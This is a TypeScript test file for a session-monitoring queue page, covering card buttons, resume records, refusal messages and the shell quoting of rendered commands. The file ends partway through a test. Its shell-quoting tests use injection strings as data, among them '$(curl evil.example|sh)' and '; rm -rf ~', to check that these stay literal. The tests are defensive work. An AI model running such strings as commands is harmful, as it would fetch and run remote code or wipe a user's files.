// Queue owner page: the nav slot, card precedence text, resume records and the card controls, read from the shipped
// queue.jsx through test/lib/render-screen.ts.
//
// Runner: npx tsx --test test/queue.owner-page.client.test.ts

import test, { describe } from "node:test";
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import vm from "node:vm";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { messageBodySchema } from "../src/server/queue/schemas.js";
import { collectText, findNodes, loadScreenModule, renderScreen, type RenderedNode } from "./lib/render-screen.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const QUEUE_SRC = resolve(__dirname, "../public/src/screens/queue.jsx");
const UI_SRC = resolve(__dirname, "../public/src/ui.jsx");
const realUiModule = (await loadScreenModule(UI_SRC)) as { UI: Record<string, unknown>; React: { createElement: (t: unknown, p: unknown) => unknown } };
const realUi = realUiModule.UI;
const realUiReact = realUiModule.React;

// window.UI stub — components resolve to transparent host elements; helpers and constants stay real.
function uiStub(): unknown {
  return new Proxy(
    {},
    {
      get: (_target, name: string) =>
        !/^[A-Z][a-z]/.test(name) && name in realUi
          ? realUi[name]
          : Object.defineProperty((props: Record<string, unknown>) => ({ __element: true, type: "ui-atom", props: { ...props, atom: name } }), "name", {
              value: name,
            }),
      has: () => true,
    },
  );
}

type Component = (props: unknown) => unknown;
interface ScreenModule {
  React: { createElement: (t: unknown, p: unknown, ...children: unknown[]) => unknown };
  [name: string]: unknown;
}

const screen = (await loadScreenModule(QUEUE_SRC, {
  URLSearchParams,
  window: { UI: uiStub(), location: { hash: "#queue" }, history: { replaceState: () => undefined } },
})) as ScreenModule;
// vm-realm values → this realm's prototypes, so deepEqual compares content
const getPlain = <T>(value: T): T => (value === undefined ? value : JSON.parse(JSON.stringify(value)));
const call = <T>(name: string, ...args: unknown[]): T => getPlain((screen[name] as (...a: unknown[]) => T)(...args));
const render = (name: string, props: unknown): RenderedNode => renderScreen(screen.React.createElement(screen[name] as Component, props)) as RenderedNode;

const SESSION_ID = "6f1c2a9e-4b7d-4e21-9a3f-0c5d8e7b1a42";
const CLI_PATH = "/Volumes/tools/atrium/scripts/atrium-queue.sh";
const READY_RESUMES = { status: "ready", data: [], error: null, busy: false };

function buildSession(overrides: Record<string, unknown> = {}) {
  return {
    id: SESSION_ID,
    profileLabel: "work-dev",
    cwd: "/Users/owner/Desktop/git/glass-atrium",
    cwdTail: "git/glass-atrium",
    configDir: null,
    state: "exited",
    launchHint: null,
    permissionHint: "default",
    marker: null,
    ...overrides,
  };
}

function buildItem(overrides: Record<string, unknown> = {}) {
  return {
    id: 41,
    kind: "decision",
    title: "Pick the migration order",
    body: "Two orders keep the shadow DB green.",
    linkedDocIds: [],
    options: [
      { code: "R1", label: "Schema first", pros: "one deploy", cons: "longer lock" },
      { code: "R2", label: "Data first", pros: "short lock", cons: "two deploys" },
    ],
    recommendedCode: "R2",
    isFreeTextAllowed: true,
    isApprovalClass: false,
    status: "open",
    queuePosition: 7,
    deferCount: 0,
    nextAttempt: 1,
    answer: { code: null, text: null },
    askedAt: "2026-11-10T06:12:43.518Z",
    answeredAt: null,
    deliveredAt: null,
    session: buildSession(),
    resumes: [],
    deviation: null,
    skipReason: null,
    canResend: false,
    ...overrides,
  };
}

function buildQueue(overrides: Record<string, unknown> = {}) {
  const calls: unknown[][] = [];
  const record = (name: string) => (...args: unknown[]) => calls.push([name, ...args]);
  return {
    calls,
    queue: {
      busy: { id: null, error: null },
      resumes: READY_RESUMES,
      readResumes: record("readResumes"),
      drafts: {},
      setDraft: record("setDraft"),
      later: record("later"),
      send: record("send"),
      answerItem: record("answerItem"),
      sessions: buildSessions(),
      reload: record("reload"),
      ...overrides,
    },
  };
}

const buttonLabelled = (tree: RenderedNode, label: string) => findNodes(tree, (node) => node.type === "button" && collectText(node).trim() === label);

describe("queue nav slot", () => {
  const ready = (awaiting: number, deviations: number) => ({ status: "ready", data: { awaiting, deviations, oldestAgeSeconds: 120 } });
  const rows = [
    { name: "a count never read gives no slot, so no zero that was not loaded", countState: { status: "loading" }, expected: undefined },
    { name: "an unread count shows a question mark rather than a blank badge", countState: { status: "error" }, expected: ["?"] },
    { name: "zero awaiting still shows the numeral", countState: ready(0, 0), expected: ["0"] },
    { name: "a count with deviations shows the awaiting numeral alone", countState: ready(2, 1), expected: ["2"] },
    { name: "a count answer without numbers reads as unread", countState: { status: "ready", data: { rows: [] } }, expected: ["?"] },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const slot = call<{ queue?: { badges: Array<{ badge: string; icon?: string }> } }>("getQueueNavBadge", row.countState);
      assert.deepEqual(slot.queue?.badges.map((badge) => badge.icon ?? badge.badge), row.expected);
    });
  }

  test("the deviation glyph rides the count only while a deviation is open", () => {
    const glyphOf = (deviations: number) =>
      call<{ queue: { badges: Array<{ glyph?: string; description: string }> } }>("getQueueNavBadge", ready(4, deviations)).queue.badges[0];
    assert.equal(glyphOf(0)?.glyph, undefined);
    assert.equal(glyphOf(2)?.glyph, (realUi.TONE_GLYPH as Record<string, string>).warn);
    assert.equal(glyphOf(2)?.description, "4 awaiting you, 2 deviations");
  });
});

describe("Later", () => {
  test("Later moves the item to the end and keeps the others in queue order", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report" }), buildItem({ id: 3 })];
    const ids = (list: Array<{ id: number }>) => list.map((item) => item.id);
    assert.deepEqual(ids(call("putLaterQ", items, 1)), [2, 3, 1]);
    assert.deepEqual(ids(call("putLaterQ", items, 2)), [1, 3, 2]);
  });

  const kinds = [
    { name: "a decision card offers Later", kind: "decision" },
    { name: "a report card offers Later", kind: "report" },
  ];
  for (const row of kinds) {
    test(row.name, () => {
      const { calls, queue } = buildQueue();
      const tree = render("QueueCardQ", { item: buildItem({ id: 9, kind: row.kind }), queue });
      const [later] = buttonLabelled(tree, "Later");
      assert.ok(later, "Later button rendered");
      (later.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), [["later", 9]]);
    });
  }
});

describe("after Send the focus moves to the next awaiting card", () => {
  const items = [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" }), buildItem({ id: 3 }), buildItem({ id: 4 })];
  const rows = [
    { name: "skips a card no longer awaiting", id: 1, expected: 3 },
    { name: "wraps to the first awaiting card from the last", id: 4, expected: 1 },
    { name: "no other awaiting card leaves the focus where it is", id: 1, list: [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" })], expected: null },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getNextAwaitingIdQ", row.list ?? items, row.id), row.expected));
});

test("after Send the focus skips a card the active filter hides", async () => {
  const module = (await loadScreenModule(QUEUE_SRC, {
    window: { UI: uiStub() },
    fetch: async () => ({ status: 200, json: async () => ({ ok: true }) }),
  })) as ScreenModule;
  const personal = buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal" });
  const items = [buildItem({ id: 1 }), buildItem({ id: 2, session: personal }), buildItem({ id: 3 })];
  const focus: unknown[] = [];
  const actions = (module.useQueueActionsQ as (deps: unknown) => { answerItem: (id: number, body: unknown) => Promise<void> })({
    list: { status: "ready", data: { items, nextCursor: null, isSocketDeliveryOn: true } },
    filter: { profile: "work-dev", session: "" },
    setList: () => undefined,
    setDrafts: () => undefined,
    setFocus: (next: unknown) => focus.push(next),
    reload: () => undefined,
  });
  await actions.answerItem(1, { code: "R1" });
  assert.deepEqual(getPlain(focus), [{ id: 3 }]);
});

test("card input held in page state reappears on the card after a re-render", () => {
  const { queue } = buildQueue({ drafts: { 41: { text: "keep the shadow DB" } } });
  const tree = render("QueueCardQ", { item: buildItem(), queue });
  const [field] = findNodes(tree, (node) => node.type === "textarea");
  assert.equal(field?.props.value, "keep the shadow DB");
});

describe("card state lines", () => {
  const rows = [
    { name: "unacked", deviation: "unacked", expected: "Unacked" },
    { name: "held", deviation: "held", expected: "Held" },
    { name: "expired", deviation: "expired", expected: "Expired" },
    { name: "resume pending", deviation: "resume_pending", expected: "Resume pending" },
    { name: "session not reachable shows the pull command", deviation: "session_not_reachable", expected: "Session not reachable", hasCommand: true },
    { name: "delivery off shows the pull command", deviation: "delivery_off", expected: "Delivery off — session alive", hasCommand: true },
  ];
  for (const row of rows) {
    test(`deviation label: ${row.name}`, () => {
      const text = collectText(render("CardStateQ", { item: buildItem({ status: "answered", deviation: row.deviation }), cliPath: CLI_PATH }));
      assert.ok(text.includes(row.expected), text);
      assert.equal(text.includes(`${CLI_PATH} pending`), row.hasCommand === true, text);
    });
  }

  const ANSWERED_AT = "2026-11-12T04:05:17.482Z";
  const answered = (overrides: Record<string, unknown>) => buildItem({ status: "delivered", answeredAt: ANSWERED_AT, isAnsweredOutside: false, ...overrides });
  // the line names when, by which route and on which request signal; only an unrecorded answer is flagged
  const answerRows = [
    { name: "an answer on fetch metadata", item: answered({ answerRecord: { route: "answer", signal: "fetch_metadata" } }), words: ["Answered", "same-origin request"], isFlagged: false },
    { name: "a reply on the Origin header alone", item: answered({ kind: "report", answerRecord: { route: "reply", signal: "origin" } }), words: ["Replied", "Origin header"], isFlagged: false },
    { name: "an owner message", item: answered({ answerRecord: { route: "message", signal: "fetch_metadata" } }), words: ["Sent as a message"], isFlagged: false },
    { name: "an answer from before the record", item: answered({ answerRecord: { route: "answer", signal: "before_record" } }), words: ["Answered", "before answers were recorded"], isFlagged: false },
    { name: "an answer with no record", item: answered({ answerRecord: null, isAnsweredOutside: true }), words: ["Answered outside the Queue page"], isFlagged: true },
  ];
  for (const row of answerRows) {
    test(`answer record line: ${row.name}`, () => {
      const tree = render("CardStateQ", { item: row.item });
      const text = collectText(tree);
      for (const word of row.words) assert.ok(text.includes(word), text);
      assert.ok(text.includes((realUi.formatKstDateTime as (iso: string) => string)(ANSWERED_AT)), text);
      assert.equal(findNodes(tree, (node) => /\btext-warn\b/.test(String(node.props?.className ?? ""))).length, row.isFlagged ? 1 : 0, text);
    });
  }

  test("an item with no answer carries no answer record line", () => {
    const text = collectText(render("CardStateQ", { item: buildItem({ answerRecord: null, isAnsweredOutside: false }) }));
    assert.doesNotMatch(text, /Answered|Replied|Sent as/);
  });

  test("a wrapper-launched session's card names the same-uid risk", () => {
    const text = collectText(render("CardStateQ", { item: buildItem({ session: buildSession({ launchHint: "accept_wrapper" }) }) }));
    assert.match(text, /any same-uid process can drive this bypass session/);
  });

  test("an approval-class decision says the terminal confirmation is still needed", () => {
    const text = (item: unknown) => collectText(render("DecisionBodyQ", { item, draft: {}, onDraft: () => undefined }));
    assert.match(text(buildItem({ isApprovalClass: true })), /terminal confirmation is still needed/);
    assert.doesNotMatch(text(buildItem()), /terminal confirmation/);
  });
});

describe("card precedence notes", () => {
  const occupant = { profileLabel: "personal", cwdTail: "wt/owner-queue", sessionIdPrefix: "9b2e7c41" };
  // a note's parts: a string is prose, { machine } renders through MachineString
  const markedLine = [
    "waiting on personal · wt/owner-queue · ",
    { machine: "9b2e7c41" },
    ", whose automatic resume has not registered: this one waits until that session registers " +
      "or is resumed in a terminal (see its card), and resumes automatically once that session has then ended",
  ];
  const generic = ["another session is live or resuming in this worktree: this one resumes automatically once that one has ended"];
  const capturedIdNote = [
    "the resumed session may still be running in the background: under profile work-dev, check it with ",
    { machine: "claude logs bg-7f3a" },
    ", and resume it yourself in a terminal only after ",
    { machine: "claude stop bg-7f3a" },
  ];
  const markedSession = (bgId: string | null, configDir: string | null = null) =>
    buildSession({ marker: { setAt: "2026-11-10T06:20:11.204Z", bgId }, configDir });
  const pending = (skipReason: unknown, extra: Record<string, unknown> = {}) => buildItem({ status: "resume_pending", skipReason, ...extra });
  const rows = [
    { name: "a used attempt asks for Resend", item: pending({ kind: "resume_used" }), expected: [["automatic resume used — Resend to try again"]] },
    { name: "an approval item needs the terminal", item: pending({ kind: "approval" }), expected: [["approval needs your terminal: resume the session yourself"]] },
    { name: "a resume in flight shows no text", item: pending({ kind: "in_flight" }), expected: [] },
    { name: "no marked occupant gives the generic worktree line", item: pending({ kind: "shared_worktree", markedOccupants: [], hasUnmarkedOccupant: true }), expected: [generic] },
    { name: "a marked occupant is named", item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: false }), expected: [markedLine] },
    {
      name: "a marked and a live occupant give the marked line then the generic line",
      item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: true }),
      expected: [markedLine, generic],
    },
    { name: "the captured-id marker form names the bg id and the profile", item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }), expected: [capturedIdNote] },
    {
      name: "the listing marker form names the cwd and the full session id",
      item: pending({ kind: "marker" }, { session: markedSession(null) }),
      expected: [
        [
          "the resumed session may still be running in the background: under profile work-dev, check ",
          { machine: "claude agents --json --cwd /Users/owner/Desktop/git/glass-atrium" },
          " for the entry of session ",
          { machine: SESSION_ID },
          ", and resume it yourself in a terminal only once that entry is no longer listed, or after ",
          { machine: "claude stop <id>" },
          " with that entry's id",
        ],
      ],
    },
    {
      name: "the marker on an unacked card of a marked session replaces any skip text",
      item: buildItem({ status: "unacked", deviation: "unacked", session: markedSession("bg-7f3a") }),
      expected: [capturedIdNote],
    },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(call("getCardNotesQ", row.item), row.expected));

  const configRows = [
    { name: "captured-id form carries the recorded config dir in each command", bgId: "bg-7f3a" },
    { name: "listing form carries the recorded config dir in each command", bgId: null },
  ];
  for (const row of configRows) {
    test(row.name, () => {
      const [note] = call<Array<Array<string | { machine: string }>>>("getCardNotesQ", buildItem({ session: markedSession(row.bgId, "/Users/owner/.claude-work-dev") }));
      const commands = (note ?? []).flatMap((part) => (typeof part === "string" || !part.machine.includes("claude ") ? [] : [part.machine]));
      assert.equal(commands.length, 2, String(commands));
      for (const command of commands) assert.ok(command.startsWith("CLAUDE_CONFIG_DIR=/Users/owner/.claude-work-dev claude "), command);
    });
  }

  // POSIX single-quote form: a value outside the plain-path set → one literal word, never expanded or split
  const shellWordRows = [
    { name: "a plain path stays bare", value: "/Users/owner/Desktop/git/glass-atrium", shellWord: "/Users/owner/Desktop/git/glass-atrium" },
    { name: "a space keeps the path one word", value: "/Users/owner/My Repos/app", shellWord: "'/Users/owner/My Repos/app'" },
    { name: "command substitution stays literal", value: "/tmp/x$(curl evil.example|sh)", shellWord: "'/tmp/x$(curl evil.example|sh)'" },
    { name: "a command separator stays literal", value: "/tmp/a; rm -rf ~", shellWord: "'/tmp/a; rm -rf ~'" },
    { name: "a backtick stays literal", value: "/tmp/`id`", shellWord: "'/tmp/`id`'" },
    { name: "an embedded single quote closes, escapes and reopens", value: "/tmp/it's", shellWord: "'/tmp/it'\\''s'" },
  ];
  for (const row of shellWordRows) {
    test(`every value a rendered command carries is shell-quoted: ${row.name}`, () => {
      const listing = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(null, row.value) }))[0] ?? [];
      const listed = buildItem({ session: { ...markedSession(null), cwd: row.value } });
      const [cwdCommand] = (call<Array<string | { machine: string }>[]>("getCardNotesQ", listed)[0] ?? []).flatMap((part) => (typeof part === "string" ? [] : [part.machine]));
      const captured = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(row.value) }))[0] ?? [];
      const pull = collectText(render("CardStateQ", { item: buildItem({ status: "answered", deviation: "delivery_off" }), cliPath: row.value }));
      assert.equal(cwdCommand, `claude agents --json --cwd ${row.shellWord}`);
      assert.ok(listing.some((part) => typeof part !== "string" && part.machine.startsWith(`CLAUDE_CONFIG_DIR=${row.shellWord} claude `)), JSON.stringify(listing));
      assert.ok(captured.some((part) => typeof part !== "string" && part.machine === `claude logs ${row.shellWord}`), JSON.stringify(captured));
      assert.ok(pull.includes(`${row.shellWord} pending`), pull);
    });
  }

  test("a note's commands and ids render through MachineString and its prose carries no backticks", () => {
    const tree = render("CardStateQ", { item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }) });
    const machine = findNodes(tree, (node) => node.props.atom === "MachineString").map((node) => collectText(node));
    assert.deepEqual(machine, ["claude logs bg-7f3a", "claude stop bg-7f3a"]);
    assert.doesNotMatch(collectText(tree), /`/);
  });

  test("a marked session with a used attempt shows the marker reason and no Resend", () => {
    const item = pending({ kind: "marker" }, { session: markedSession("bg-7f3a"), canResend: false, resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: "bg-7f3a" }] });
    const tree = render("QueueCardQ", { item, queue: buildQueue().queue });
    assert.match(collectText(tree), /claude logs bg-7f3a/);
    assert.equal(buttonLabelled(tree, "Resend").length, 0);
  });

  test("a used attempt in a shared worktree shows the used state with Resend", () => {
    const item = pending({ kind: "resume_used" }, { canResend: true });
    const { calls, queue } = buildQueue();
    const tree = render("QueueCardQ", { item, queue });
    assert.match(collectText(tree), /automatic resume used — Resend to try again/);
    const [resend] = buttonLabelled(tree, "Resend");
    (resend?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls), [["send", 41, "resend"]]);
  });
});

describe("automatic resume record", () => {
  const rows = [
    { name: "a spawn", resume: { result: "sent", abortReason: null }, expected: "spawned" },
    { name: "a failed spawn", resume: { result: "failed", abortReason: null }, expected: "failed" },
    { name: "an abort because the session came back", resume: { result: "aborted", abortReason: "session_returned" }, expected: "not spawned: session came back" },
    { name: "an abort for a shared worktree", resume: { result: "aborted", abortReason: "shared_worktree" }, expected: "not spawned: another session in this worktree" },
  ];
  for (const row of rows) test(`result label: ${row.name}`, () => assert.equal(call("getResumeResultLabelQ", row.resume), row.expected));

  test("each card resume shows its time, account and result", () => {
    const resume = { attempt: 2, sentAt: "2026-11-10T06:20:11.204Z", result: "aborted", abortReason: "session_returned", bgId: null };
    const text = collectText(render("QueueCardQ", { item: buildItem({ status: "resume_pending", resumes: [resume] }), queue: buildQueue().queue }));
    const line = text.split("Automatic resume ")[1] ?? "";
    assert.ok(line.startsWith((realUi.formatKstDateTime as (iso: string) => string)(resume.sentAt)), line);
    assert.match(line, /work-dev · attempt 2 · not spawned: session came back/);
  });

});

describe("recent automatic resumes", () => {
  const row = (itemId: number, title: string, attempt: number, result: string) => ({
    attempt,
    sentAt: "2026-11-10T06:40:00.870Z",
    result,
    abortReason: null,
    bgId: null,
    item: { id: itemId, title },
    session: { profileLabel: ".claude-work", cwdTail: "atrium/hooks" },
  });

  test("the record lists the server's resume rows in its order, each with account, worktree and item title", () => {
    const resumes = [row(9, "Pick the lock order", 2, "acked"), row(4, "Pick the index", 1, "sent")];
    const text = collectText(render("RecentResumesQ", { region: { ...READY_RESUMES, data: resumes }, onRetry: () => undefined }));
    const lines = text.split("Automatic resume ").slice(1);
    assert.equal(lines.length, 2, text);
    assert.match(lines[0] ?? "", /\.claude-work · atrium\/hooks · attempt 2 · spawned · acknowledged\s+— Pick the lock order/);
    assert.match(lines[1] ?? "", /attempt 1 · spawned\s+— Pick the index/);
  });

  const views = [
    { name: "a failed read shows the shared region failure with Retry", region: { status: "error", data: null, error: "HTTP 503 database_unavailable", busy: false }, atom: "RegionUnavailable", isShown: true },
    { name: "an empty record shows nothing", region: READY_RESUMES, atom: "Card", isShown: false },
    { name: "a first read in flight shows nothing", region: { status: "loading", data: null, error: null, busy: true }, atom: "Card", isShown: false },
  ];
  for (const view of views) {
    test(view.name, () => {
      const tree = render("RecentResumesQ", { region: view.region, onRetry: () => undefined });
      assert.equal(findNodes(tree, (node) => node.props?.atom === view.atom).length > 0, view.isShown);
    });
  }

  test("the record is read from the resume route, whatever the owner list holds", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: realUi },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ resumes: [row(9, "Pick the lock order", 1, "acked")] }) };
      },
    })) as ScreenModule;
    let region: unknown = realUi.INITIAL_REGION_STATE;
    const setResumes = (next: (prev: unknown) => unknown) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes });
    assert.deepEqual(urls, ["/api/queue/owner/resumes"]);
    assert.deepEqual((getPlain(region) as { data: Array<{ item: { id: number } }> }).data.map((resume) => resume.item.id), [9]);
  });
});

describe("screen", () => {
  test("the Queue screen renders its header and a loading body before the first read", () => {
    const tree = render("ScreenQueue", {});
    const atoms = findNodes(tree, (node) => node.type === "ui-atom").map((node) => node.props.atom);
    assert.ok(atoms.includes("PageHeader"), String(atoms));
    assert.ok(atoms.includes("LoadingPlaceholder"), String(atoms));
  });

  test("a loaded list renders one card per item and the degraded banner while socket delivery is off", () => {
    const { queue } = buildQueue();
    const data = { items: [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report", linkedDocIds: [43944] })], nextCursor: null, isSocketDeliveryOn: false };
    const tree = render("QueueListQ", { queue: { ...queue, list: { status: "ready", data }, filter: { profile: "", session: "" }, setFilter: () => undefined } });
    assert.equal(findNodes(tree, (node) => node.type === "QueueCardQ").length, 2);
    assert.equal(findNodes(tree, (node) => node.type === "DegradedBannerQ").length, 1);
    const [link] = findNodes(tree, (node) => node.props.atom === "Link");
    assert.equal(link?.props.href, "#clauded-docs?doc=43944");
  });
});

describe("an owner action's answer", () => {
  const draft = { 41: { code: "R2", text: "keep the shadow DB" } };
  const run = async (status: number, body: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => body };
      },
    })) as ScreenModule;
    let drafts: Record<string, unknown> = { ...draft };
    let busy: unknown = null;
    const counts = { reload: 0 };
    const isDone = await (module.sendActionQ as (deps: unknown) => Promise<boolean>)({
      id: 41,
      action: "answer",
      body: { code: "R2", text: "keep the shadow DB" },
      setBusy: (next: unknown) => { busy = next; },
      setDrafts: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { drafts = next(drafts); },
      reload: () => { counts.reload += 1; },
    });
    return { isDone, drafts: getPlain(drafts), busy: getPlain(busy), posts: getPlain(posts), reloads: counts.reload };
  };

  test("a taken answer posts the card's body, clears its draft and re-reads the list", async () => {
    const result = await run(200, { ok: true });
    assert.deepEqual(result.posts, [{ url: "/api/queue/owner/items/41/answer", body: { code: "R2", text: "keep the shadow DB" } }]);
    assert.equal(result.isDone, true);
    assert.equal(result.drafts[41], undefined);
    assert.equal(result.reloads, 1);
  });

  const refusals = [
    {
      name: "a page-origin refusal keeps the draft and shows on the card",
      status: 403,
      body: { error: "forbidden" },
      error: { id: 41, message: "The monitor refused this action. Refresh and try again." },
    },
    {
      name: "a refusal keeps the draft and shows the reason on the card",
      status: 400,
      body: { error: "unknown_option", reason: "the code is not one of this item's options" },
      error: { id: 41, message: "Refused: the code is not one of this item's options." },
    },
  ];
  for (const row of refusals) {
    test(row.name, async () => {
      const result = await run(row.status, row.body);
      assert.equal(result.isDone, false);
      assert.deepEqual(result.drafts, draft);
      assert.deepEqual(result.busy, { id: null, error: row.error });
      assert.equal(result.reloads, 0);
    });
  }
});

describe("card buttons", () => {
  const sendRows = [
    { name: "no option and no text leaves Send disabled", draft: {}, body: null },
    { name: "whitespace-only text leaves Send disabled", draft: { text: "   " }, body: null },
    { name: "a picked option alone sends its code", draft: { code: "R1" }, body: { code: "R1" } },
    { name: "text alone sends the text", draft: { text: "hold until Friday" }, body: { text: "hold until Friday" } },
    { name: "an option and text send both", draft: { code: "R2", text: "after the deploy" }, body: { code: "R2", text: "after the deploy" } },
  ];
  for (const row of sendRows) {
    test(row.name, () => {
      const { calls, queue } = buildQueue();
      const [send] = buttonLabelled(render("CardActionsQ", { item: buildItem(), draft: row.draft, queue, isBusy: false }), "Send");
      assert.equal(send?.props.disabled, row.body === null);
      if (row.body !== null) (send?.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), row.body === null ? [] : [["answerItem", 41, row.body]]);
    });
  }

  test("Seen on a report sends the seen action", () => {
    const { calls, queue } = buildQueue();
    const [seen] = buttonLabelled(render("CardActionsQ", { item: buildItem({ kind: "report" }), draft: {}, queue, isBusy: false }), "Seen");
    (seen?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls), [["send", 41, "seen"]]);
  });

  const replyRows = [
    { name: "a typed reply offers Send reply with the typed text", draft: { text: "thanks, merged" }, calls: [["send", 41, "reply", { text: "thanks, merged" }]] },
    { name: "a blank reply offers no Send reply", draft: { text: "  " }, calls: null },
  ];
  for (const row of replyRows) {
    test(row.name, () => {
      const { calls, queue } = buildQueue();
      const [reply] = buttonLabelled(render("CardActionsQ", { item: buildItem({ kind: "report" }), draft: row.draft, queue, isBusy: false }), "Send reply");
      assert.equal(reply === undefined, row.calls === null);
      (reply?.props.onClick as (() => void) | undefined)?.();
      assert.deepEqual(getPlain(calls), row.calls ?? []);
    });
  }
});

// spacing reads the role-key ladder (index.html tailwind config) → a number or a px value in a queue node is drift
const NUMERIC_SPACING_CLASS = /(^|\s)-?(p|m|gap|space)(x|y|t|r|b|l|s|e)?-(\d|\[)/;

describe("the queue page spaces on role keys only", () => {
  const data = {
    items: [
      buildItem({ id: 1, isApprovalClass: true, deviation: "delivery_off", resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: null }] }),
      buildItem({ id: 2, kind: "report", linkedDocIds: [43944], session: buildSession({ launchHint: "accept_wrapper", marker: { setAt: "2026-11-10T06:20:11.204Z", bgId: null } }) }),
    ],
    nextCursor: 9,
    isSocketDeliveryOn: false,
  };
  const states = [
    { name: "a loaded list with cards, the banner and Show more", node: () => render("QueueListQ", { queue: { ...buildQueue().queue, list: { status: "ready", data }, filter: { profile: "", session: "" }, setFilter: () => undefined } }) },
    { name: "a card with a refusal", node: () => render("QueueCardQ", { item: data.items[0], queue: buildQueue({ busy: { id: null, error: { id: 1, message: "Refused: x." } } }).queue }) },
    {
      name: "the sessions region with a ticked row, the composer and a refusal",
      node: () =>
        render("SessionsRegionQ", {
          sessions: buildSessions({ selectedIds: [SESSION_ID], isEndedShown: true, composer: { text: "rebase on main", isBusy: false, error: "Refused: x.", sentCount: null } }),
          onSent: () => undefined,
        }),
    },
  ];
  for (const row of states) {
    test(row.name, () => {
      const classes = findNodes(row.node(), () => true).map((node) => String(node.props?.className ?? ""));
      assert.deepEqual(classes.filter((value) => NUMERIC_SPACING_CLASS.test(value)), []);
    });
  }
});

describe("report reply", () => {
  const rows = [
    { name: "a report that takes a reply shows the reply field", isFreeTextAllowed: true, fields: 1 },
    { name: "a report that takes no reply shows no reply field", isFreeTextAllowed: false, fields: 0 },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const tree = render("ReportBodyQ", { item: buildItem({ kind: "report", isFreeTextAllowed: row.isFreeTextAllowed }), draft: {}, onDraft: () => undefined });
      assert.equal(findNodes(tree, (node) => node.type === "textarea").length, row.fields);
    });
  }
});

describe("action refusal copy", () => {
  const rows = [
    { name: "the server's worded reason is shown", answer: { status: 400, data: { error: "free_text_not_allowed", reason: "this report takes no reply" } }, expected: "Refused: this report takes no reply." },
    { name: "a refusal with no reason shows fixed copy", answer: { status: 400, data: { error: "invalid_input", issues: [] } }, expected: "The monitor refused this action. Refresh and try again." },
    { name: "a refusal with no body shows fixed copy", answer: { status: 400, data: null }, expected: "The monitor refused this action. Refresh and try again." },
    { name: "a state change names the refresh", answer: { status: 409, data: { error: "conflict", reason: "item is answered" } }, expected: "Refused: the item changed state. Refresh to see where it is now." },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getActionErrorQ", row.answer), row.expected));
});

describe("refusal lines", () => {
  const message = "Refused: the item changed state. Refresh to see where it is now.";
  const rows = [
    { name: "a refused card action", node: () => render("QueueCardQ", { item: buildItem({ id: 1 }), queue: buildQueue({ busy: { id: null, error: { id: 1, message } } }).queue }) },
    {
      name: "a refused send",
      node: () =>
        render("MessageComposerQ", {
          targets: { ids: [SESSION_ID], endedCount: 0 },
          composer: { text: "rebase on main", isBusy: false, error: message, sentCount: null },
          onText: () => undefined,
          onSend: () => undefined,
          onClear: () => undefined,
        }),
    },
  ];
  for (const row of rows) {
    test(`${row.name} is an alert led by the crit glyph, toned whole`, () => {
      const alerts = findNodes(row.node(), (node) => node.props?.role === "alert" && /\btext-crit\b/.test(String(node.props?.className ?? "")));
      assert.equal(alerts.length, 1, row.name);
      const text = collectText(alerts[0] as RenderedNode);
      assert.deepEqual([text.startsWith((realUi.TONE_GLYPH as Record<string, string>).crit), text.endsWith(message)], [true, true], text);
    });
  }
});

describe("queue filter bar", () => {
  const items = [
    buildItem({ id: 1, session: buildSession({ profileLabel: "work-dev" }) }),
    buildItem({ id: 2, session: buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal", cwdTail: "wt/owner-queue" }) }),
  ];
  const renderBar = (filter: Record<string, string>) => {
    const picks: unknown[] = [];
    const tree = render("QueueFilterBarQ", { items, filter, onFilter: (next: unknown) => picks.push(next) });
    const [bar] = findNodes(tree, (node) => node.props.atom === "FilterBar");
    const triggers = Object.fromEntries(findNodes(tree, (node) => node.props.atom === "FilterTrigger").map((node) => [node.props.axis, node.props]));
    return { bar, triggers, picks };
  };

  const rows = [
    { name: "at defaults each trigger reads All and the reset stays hidden", filter: { profile: "", session: "" }, account: "All", session: "All", isApplied: false },
    { name: "a chosen account names that account and shows the reset", filter: { profile: "personal", session: "" }, account: "personal", session: "All", isApplied: true },
    {
      name: "a chosen session names its worktree tail and id prefix",
      filter: { profile: "", session: SESSION_ID },
      account: "All",
      session: "git/glass-atrium · 6f1c2a9e",
      isApplied: true,
    },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const { bar, triggers } = renderBar(row.filter);
      assert.equal(triggers.Account?.value, row.account);
